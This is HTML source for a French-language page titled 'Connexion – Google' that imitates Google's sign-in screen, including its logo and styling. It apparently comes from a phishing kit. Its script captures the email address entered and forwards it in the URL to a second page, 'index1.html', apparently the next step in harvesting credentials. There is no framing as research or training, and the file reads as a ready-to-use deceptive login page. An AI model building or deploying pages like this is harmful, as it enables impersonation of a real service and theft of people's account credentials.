
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Connexion – Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f1f3f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 40px;
      border-radius: 8px;
      width: 450px;
      box-shadow: 0px 1px 6px rgba(60, 64, 67, 0.3);
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      color: #202124;
    }
    input, button {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-top: 20px;
    }
    button {
      background: #1a73e8;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" />
    <h1>Connexion</h1>
    <p>Utilisez votre compte Google</p>
    <form id="emailForm">
      <input type="email" name="email" placeholder="Adresse e-mail ou téléphone" required />
      <button type="submit">Suivant</button>
    </form>
  </div>
  <script>
    document.getElementById("emailForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const email = this.email.value;
      window.location.href = `index1.html?email=${encodeURIComponent(email)}`;
    });
  </script>
</body>
</html>
